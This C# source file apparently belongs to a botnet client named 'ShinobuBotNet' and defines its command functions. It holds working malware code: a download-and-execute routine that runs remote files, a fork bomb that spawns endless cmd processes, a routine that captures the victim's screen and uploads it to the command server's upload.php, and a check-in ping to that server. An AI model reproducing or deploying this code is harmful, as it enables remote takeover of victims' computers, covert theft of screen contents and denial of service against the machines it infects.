using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows;
using System.Windows.Forms;

namespace ShinobuBotNet
{
    class functions
    {
        public static void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }

        public static void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string file_path = web.DownloadFile(URI);
                Process.Start(file_path);
            });
            thr.Start();
        }

        public static void ping()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string PingURI = configs.server + "ping.php";
            Thread thr = new Thread(() =>
           {
               wc.DownloadString(PingURI);
           });
            thr.Start();

        }

        public static void forkbomb()
        {
            Thread thr = new Thread(() =>
            {
                ProcessStartInfo psi;
                psi = new ProcessStartInfo("cmd", @"start");
                while (true)
                {
                    Process.Start(psi);
                }
            });
            thr.Start();
        }
        

        public static void screenshot()
        {
            Thread thr = new Thread(() =>
            {
                //делаем скрин
                string file_name = "screnshot.jpg";
                Graphics graph = null;
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                graph = Graphics.FromImage(bmp);
                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                bmp.Save(file_name); ;
                //отправка файла
                System.Net.WebClient Client = new System.Net.WebClient();
                Client.Headers.Add("png/jpg", "binary/octet-stream");
                byte[] result = Client.UploadFile(configs.server + "upload.php?id=" + API.Get_ID(), "POST", file_name);
            });

        }


        public static void MSG(string text)
        {
            System.Windows.MessageBox.Show(text);
        }


    }
}
